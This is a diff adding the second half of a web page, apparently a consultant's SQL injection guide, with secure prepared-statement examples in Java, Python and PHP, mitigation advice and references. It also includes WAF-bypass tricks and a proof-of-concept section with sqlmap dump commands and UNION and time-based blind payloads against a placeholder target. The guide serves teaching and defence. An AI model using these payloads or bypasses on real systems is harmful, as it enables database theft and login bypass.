@@ -218,4 +218,88 @@ ResultSet rs = stmt.executeQuery(query);</pre>
         <strong>✅ Parameterized Queries (Prepared Statements):</strong> Always use prepared statements with bound parameters.<br>
         <strong>✅ Input Validation:</strong> Whitelist allowed characters and validate data types.<br>
         <strong>✅ Stored Procedures:</strong> Use stored procedures with limited privileges.<br>
-        <strong>✅ Escaping User Input:</strong> Properly escape
+        <strong>✅ Escaping User Input:</strong> Properly escape special characters.<br>
+        <strong>✅ Least Privilege:</strong> Database accounts should have minimal required permissions.
+      </div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// Secure implementation (Java - PreparedStatement)
+String query = "SELECT * FROM users WHERE id = ?";
+PreparedStatement stmt = conn.prepareStatement(query);
+stmt.setInt(1, Integer.parseInt(userId));
+ResultSet rs = stmt.executeQuery();
+
+// Python - Parameterized query
+cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+
+// PHP - PDO
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
+$stmt->execute(['id' => $userId]);</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>🔓 Mitigation Bypass</h2>
+      <ul>
+        <li><strong>Weak WAF Rules:</strong> Use case obfuscation (<code>Or 1=1</code>), comments (<code>/**/</code>), or URL encoding</li>
+        <li><strong>Incomplete Blacklisting:</strong> Use alternative SQL syntax or stacked queries</li>
+        <li><strong>Encoding Tricks:</strong> Double URL encoding, Unicode encoding</li>
+      </ul>
+    </div>
+
+    <div class="content-section">
+      <h2>⚠️ Risk / Impact</h2>
+      <div class="vulnerability-box">
+        <strong>Severity: Critical</strong><br><br>
+        <strong>Impact:</strong>
+        <ul>
+          <li><strong>Data breach:</strong> Read sensitive data (usernames, passwords, PII, financial data)</li>
+          <li><strong>Authentication bypass:</strong> Log in as any user without password</li>
+          <li><strong>Data manipulation:</strong> Insert, update, delete records</li>
+          <li><strong>Remote Code Execution:</strong> Execute OS commands (depending on DB permissions)</li>
+          <li><strong>Denial of Service:</strong> Delete tables or overload database</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>📎 Proof of Concept (PoC)</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># SQLmap automated exploitation
+sqlmap -u "https://target.com/page?id=1" --dbs
+sqlmap -u "https://target.com/page?id=1" -D database_name --tables
+sqlmap -u "https://target.com/page?id=1" -D database_name -T users --dump
+
+# Manual exploitation
+https://target.com/page?id=1' UNION SELECT username,password FROM users--
+
+# Time-based blind (MySQL)
+https://target.com/page?id=1' AND SLEEP(5)--</pre>
+      </div>
+    </div>
+
+    <div class="content-section">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" style="color: var(--primary);">OWASP SQL Injection</a></li>
+        <li><a href="https://cwe.mitre.org/data/definitions/89.html" style="color: var(--primary);">CWE-89: SQL Injection</a></li>
+        <li><a href="https://portswigger.net/web-security/sql-injection" style="color: var(--primary);">PortSwigger: SQL Injection</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+  </div>
+</main>
+
+<footer><p>Saikumar Raju — Cybersecurity Consultant | SQL Injection - Complete Guide</p></footer>
+
+<script>
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) { mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show')); }
+  const themeToggle = document.getElementById('themeToggle'); if (themeToggle) { themeToggle.addEventListener('click', () => { document.body.classList.toggle('light'); const icon = themeToggle.querySelector('i'); if (document.body.classList.contains('light')) { icon.classList.remove('fa-moon'); icon.classList.add('fa-sun'); themeToggle.innerHTML = '<i class="fas fa-sun"></i> Light'; } else { icon.classList.remove('fa-sun'); icon.classList.add('fa-moon'); themeToggle.innerHTML = '<i class="fas fa-moon"></i> Dark'; } }); }
+  function copyCode(btn) { const code = btn.parentElement.querySelector('pre').innerText; navigator.clipboard.writeText(code); btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 2000); }
+</script>
+</body>
+</html>
